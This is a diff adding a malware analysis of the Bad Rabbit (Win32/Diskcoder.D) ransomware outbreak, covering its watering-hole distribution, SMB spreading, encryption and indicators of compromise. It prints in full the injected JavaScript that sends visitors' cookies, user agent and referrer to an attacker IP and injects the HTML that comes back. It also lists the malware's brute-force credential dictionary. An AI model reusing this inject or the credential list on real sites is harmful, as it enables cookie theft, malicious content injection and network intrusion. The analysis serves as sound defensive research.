@@ -1,0 +1,107 @@
+A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some details about this new variant of Petya.
+
+UPDATE (October 27 - 15:35 CEST): A new report suggested that EternalRomance - one of the leaked NSA tools - has been used to spread Diskcoder.D in the network. We were able to confirm this by installing the out-of-life-cycle patch MS17-010 (a patch addressing vulnerabilities misused by the leaked NSA exploits), which stopped the further spread of the malware via IPC share.
+
+A new ransomware outbreak today and has hit some major infrastructure in Ukraine including Kiev metro. Here are some of the details about this new variant.
+
+Drive-by download via watering hole on popular sites
+
+One of the distribution method of Bad Rabbit is via drive-by download. Some popular websites are compromised and have JavaScript injected in their HTML body or in one of their .js files.
+
+Here is a beautified version of the inject:
+
+function e(d) { var xhr = null; if (!!window.XMLHttpRequest) { xhr = new XMLHttpRequest(); } else if (!!window.ActiveXObject) { var xhrs = ['Microsoft.XMLHTTP', 'Msxml2.XMLHTTP', 'Msxml2.XMLHTTP.3.0', 'Msxml2.XMLHTTP.6.0']; for (var i = 0; i < xhrs.length; i++) { try { xhr = ActiveXObject(xhrs[i]); break; } catch (e) {} } } if (!!xhr) { xhr.open('POST', 'http://185.149.120\.3/scholargoogle/'); xhr.timeout = 10000; xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.onreadystatechange = function() { if (xhr.readyState == 4 && xhr.status == 200) { var resp = xhr.responseText; if (resp) { var fans = JSON.parse(resp); if (fans) { var an_s = decodeURIComponent(fans.InjectionString).replace(/\+/g, '%20'); var da = document.createElement('div'); da.id = 'ans'; da.innerHTML = an_s; document.body.appendChild(da); } } } }; var pd = []; for (var k in d) { if (d.hasOwnProperty(k)) { pd.push(k + '=' + d[k]); } } var dc = pd.join('&'); xhr.send(dc); } } e({ 'agent': navigator.userAgent, 'referer': document.referrer, 'cookie': document.cookie, 'domain': window.location.hostname, 'c_state': !!document.cookie });
+
+This script reports the following to 185.149.120[.]3, which doesn't seem to respond at the moment.
+
+Browser User-Agent
+
+Referrer
+
+Cookie from the visited site
+
+Domain name of the visited site
+
+Server side logic can determine if the visitor is of interest and then add content to the page. In that case, what we have seen is that a popup asking to download an update for Flash Player is shown in the middle of the page.
+
+When clicking on the "Install" button, download of an executable file from 1dnscontrol[.]com is initiated. This executable file, install_flash_player.exe is the dropper for Win32/Diskcoder.D.
+
+Finally the computer is locked and the malware shows the ransom note:
+
+The payment page:
+
+Spreading via SMB
+
+Win32/Diskcoder.D has the ability to spread via SMB. As opposed to some public claims, it does not use the EternalBlue vulnerability like the Win32/Diskcoder.C (Not-Petya) outbreak. First, it scans internal networks for open SMB shares. It looks for the following shares:
+
+admin
+
+atsvc
+
+browser
+
+eventlog
+
+lsarpc
+
+netlogon
+
+ntsvcs
+
+spoolss
+
+samr
+
+srvsvc
+
+scerpc
+
+svcctl
+
+wkssvc
+
+Mimikatz is launched on the compromised computer to harvest credentials. A hardcoded list of usernames and passwords is also present.
+
+Usernames Passwords Administrator Administrator Admin administrator Guest Guest User guest User1 User user-1 user Test Admin root adminTest buh test boss root ftp 123 rdp 1234 rdpuser 12345 rdpadmin 123456 manager 1234567 support 12345678 work 123456789 other user 1234567890 operator Administrator123 backup administrator123 asus Guest123 ftpuser guest123 ftpadmin User123 nas user123 nasuser Admin123 nasadmin admin123Test123 superuser test123 netguest password alex 111111 55555 77777 777 qwe qwe123 qwe321 qwer qwert qwerty qwerty123 zxc zxc123 zxc321 zxcv uiop 123321 321 love secret sex god
+
+When working credentials are found, the infpub.dat file is dropped into the Windows directory and executed through SCManager and rundll.exe.
+
+Encryption
+
+Win32/Diskcoder.D is modified version of Win32/Diskcoder.C. Bugs in file encryption were fixed. The encryption now uses DiskCryptor, an open source legitimate software used to do full drive encryption. Keys are generated using CryptGenRandom and then protected by a hardcoded RSA 2048 public key.
+
+Like before, AES-128-CBC is used.
+
+Distribution
+
+Interestingly, ESET telemetry shows that Ukraine accounts only for 12.2% of the total number of times we have seen the dropper component Here are the statistics:
+
+Russia: 65%
+
+Ukraine: 12.2%
+
+Bulgaria: 10.2%
+
+Turkey: 6.4%
+
+Japan: 3.8%
+
+Other: 2.4%
+
+This pretty much matches the distribution of compromised websites that include the malicious JavaScript. So why does Ukraine seem to be more hit than the rest?
+
+It's interesting to note that all these big companies were all hit at the same time. It is possible that the group already had a foot inside their network and launched the watering hole attack at the same time as a decoy. Nothing says they fell for the "Flash update". ESET is still investigating and we will post our finding as we discover them.
+
+Samples
+
+SHA-1 Filename ESET Detection name Description 79116fe99f2b421c52ef64097f0f39b815b20907 infpub.dat Win32/Diskcoder.D Diskcoder afeee8b4acff87bc469a6f0364a81ae5d60a2add dispci.exe Win32/Diskcoder.D Lockscreen 413eba3973a15c1a6429d9f170f3e8287f98c21c Win32/RiskWare.Mimikatz.X Mimikatz (32-bits) 16605a4a29a101208457c47ebfde788487be788d Win64/Riskware.Mimikatz.X Mimikatz (64-bits) de5c8d858e6e41da715dca1c019df0bfb92d32c0 install_flash_player.exe Win32/Diskcoder.D Dropper 4f61e154230a64902ae035434690bf2b96b4e018 page-main.js JS/Agent.NWC JavaScript on compromised sites
+
+C&C servers
+
+Payment site: http://caforssztxqzf2nm[.]onion
+
+Inject URL: http://185.149.120[.]3/scholargoogle/
+
+Distribution URL: hxxp://1dnscontrol[.]com/flash_install.php
+
+List of compromised sites:
